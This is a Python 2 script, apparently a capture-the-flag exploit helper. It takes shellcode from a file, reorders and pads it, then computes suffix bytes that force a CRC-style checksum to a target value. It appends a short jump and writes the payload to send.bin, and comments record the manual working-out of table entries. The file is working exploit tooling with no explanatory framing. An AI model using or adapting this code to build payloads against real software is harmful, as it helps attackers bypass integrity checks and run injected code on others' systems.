#!/usr/bin/env python2

import os, sys, struct

sc = open(sys.argv[1]).read().strip()

re = ''
for i in range(len(sc) - 4, -1, -4):
    re += sc[i : i+4]

sc = re

count = 0x4b * 4

if len(sc) + 8 > count:
    print 'too long shellcode %d' % len(sc)
    sys.exit(10)

table = [0] * 256

t = open('table').read()

for i in range(0, len(t), 4):
    table[i>>2] = struct.unpack('<I', t[i:i+4])[0]

#for i in table:
#    for j in table:
#        if (i ^ (j>>8)) & 0xffff0000 == 0xa5d50000:
#            print hex(i), hex(j)

# choose       |   last goal       |   new goal    |  char goal

# 00 00 00 00 xor (03 13 37 5c)>>8 -> 00 03 13 37  |  5c         | 0 
# 03 b6 e2 0c xor (a5 d5 50 69)>>8 -> 03 13 37 5c  |  eb         | 0x208/4
# a5 0a b5 6b xor (df e5 02 xx)>>8 -> a5 d5 50 69  |  xx         | 0x9c/4
# df 60 ef c3 xor (85 ed xx xx)>>8 -> df e5 02 xx  |  xx         | 0x2b0/4

# 85 65 30 d8 xor (88 xx xx xx)>>8 -> 85 ed xx xx  |  xx         | 0x148/4
# 88 08 5a e6 xor (xx xx xx xx)>>8 -> 88 xx xx xx  |  xx         | 0x360/4


# choose       |   last goal       |   new goal    |  char goal

# 00 00 00 00 xor (03 13 37 5c)>>8 -> 00 03 13 37  |  5c         | 0 
# 03 b6 e2 0c xor (a5 d5 50 69)>>8 -> 03 13 37 5c  |  eb         | 0x208/4
# a5 0a b5 6b xor (df e5 02 b7)>>8 -> a5 d5 50 69  |  90         | 0x9c/4
# df 60 ef c3 xor (85 ed 74 3c)>>8 -> df e5 02 b7  |  90         | 0x2b0/4

# 85 65 30 d8 xor (88 44 e4 xx)>>8 -> 85 ed 74 3c  |  xx         | 0x148/4
# 88 08 5a e6 xor (4c be xx xx)>>8 -> 88 44 e4 xx  |  xx         | 0x360/4
# 4c 69 10 5e xor (d7 xx xx xx)>>8 -> 4c be xx xx  |  xx         | 0x84 / 4
# d7 0d d2 ee xor (xx xx xx xx)>>8 -> d7 xx xx xx  |  xx         | 0x384 / 4


sc = '\x00' * (count - len(sc) - 8) + sc

goal = 0xffffffff

def enc(char):
    global goal
    index = (goal ^ ord(char)) & 0xff
    goal = (goal >> 8) ^ table[index]

suffix = []

for i in range(len(sc)):
    enc(sc[i])

for p in [0x384/4, 0x84/4, 0x360/4, 0x148/4]:
    c = (goal & 0xff) ^ p
    suffix.append(c)
    enc(chr(c))

suffix.extend([0x90, 0x90, 0xeb, 0x5c])

for i in suffix:
    sc = sc + chr(i)

print 'sc len = %d, count = %d' % (len(sc), count)

goal = 0xffffffff

for i in range(len(sc)):
    index = (goal ^ ord(sc[i])) & 0xff
    goal = (goal >> 8) ^ table[index]
    #if i > len(sc) - 10:
    #    print index, hex(table[index]), hex(goal)

print 'goal = 0x%x' % goal

f = open('send.bin', 'w')
f.write(sc)
f.close()


